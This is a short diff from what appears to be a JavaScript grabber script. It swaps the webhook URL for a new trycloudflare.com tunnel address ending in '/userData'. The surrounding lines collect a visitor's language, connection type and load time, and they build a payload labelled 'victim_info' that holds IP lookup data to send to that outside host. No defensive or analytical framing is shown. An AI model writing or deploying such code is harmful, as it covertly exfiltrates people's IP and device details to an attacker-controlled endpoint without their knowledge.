@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://gbp-certainly-progress-reload.trycloudflare.com/userData";
+                const webhookURL = "https://focus-electric-ericsson-money.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
